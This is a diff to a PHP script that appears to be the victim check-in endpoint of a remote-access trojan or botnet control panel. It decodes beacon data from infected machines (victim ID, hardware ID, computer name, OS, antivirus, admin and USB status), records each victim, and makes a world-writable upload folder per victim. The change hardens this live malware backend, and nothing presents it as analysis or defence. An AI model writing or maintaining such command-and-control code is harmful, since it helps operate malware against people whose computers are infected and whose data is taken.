@@ -7,31 +7,35 @@ $utils = new Utils;
 
 $client = new Clients;
 
-$ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
-$country = getConteryCode($ipaddress);
-$date = date("Y-m-d");
-$data = isset($_POST['data']) ? explode("|BN|", $utils->sanitize($utils->base64_decode_url($_POST['data']))) : '';
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
+    $country = getConteryCode($ipaddress);
+    $date = date("Y-m-d");
+    $post_data = $_POST['data'];
+    $data = explode("|BN|", $utils->base64_decode_url($post_data));
 
-$clientdata = [
-    'vicid' => $data[0],
-    'hwid' => strtoupper(sha1($data[1])),
-    'ipaddress' => $ipaddress,
-    'computername' => $data[2],
-    'country' => $country,
-    'os' => $data[3],
-    'insdate' => $date,
-    'update_at' => date("m/d/Y H:i:s", time()),
-    'pings' => 0,
-    'antivirus' => $data[4],
-    'version' => $data[5],
-    'status' => $data[6],
-    'is_usb' => $data[7],
-    'is_admin' => $data[8],
-];
+    $clientdata = [
+        'vicid' => $data[0],
+        'hwid' => strtoupper(sha1($data[1])),
+        'ipaddress' => $ipaddress,
+        'computername' => $data[2],
+        'country' => $country,
+        'os' => $data[3],
+        'insdate' => $date,
+        'update_at' => date("m/d/Y H:i:s", time()),
+        'pings' => 0,
+        'antivirus' => $data[4],
+        'version' => $data[5],
+        'status' => $data[6],
+        'is_usb' => $data[7],
+        'is_admin' => $data[8],
+    ];
 
-$client->newClient($clientdata);
+    $client->newClient($clientdata);
 
-@new_dir($utils->sanitize($data[0]));
+    @new_dir($utils->sanitize($data[0]));
+
+}
 
 function getConteryCode($ipaddress)
 {
@@ -47,11 +51,13 @@ function getConteryCode($ipaddress)
 
 function new_dir($victimID)
 {
+    $victimID = str_replace([".", "..", "/", "\/"], [null, null, null, null], $victimID);
+
     try {
-        @mkdir(realpath("upload/$victimID"));
-        @copy(realpath("upload/index.php"), realpath("upload/$victimID/index.php"));
-        @copy(realpath("upload/.htaccess"), realpath("upload/$victimID/.htaccess"));
-        @chmod(realpath("upload/$victimID"), 0777);
+        @mkdir(realpath("upload") . "/" . $victimID);
+        @copy(realpath("upload/index.php"), "upload" . "/" . $victimID . "/" . "index.php");
+        @copy(realpath("upload/.htaccess"), "upload" . "/" . $victimID . "/" . ".htaccess");
+        @chmod("upload" . "/" . $victimID . "/", 0777);
     } catch (Exception $e) {
         return $e->getMessage();
     }
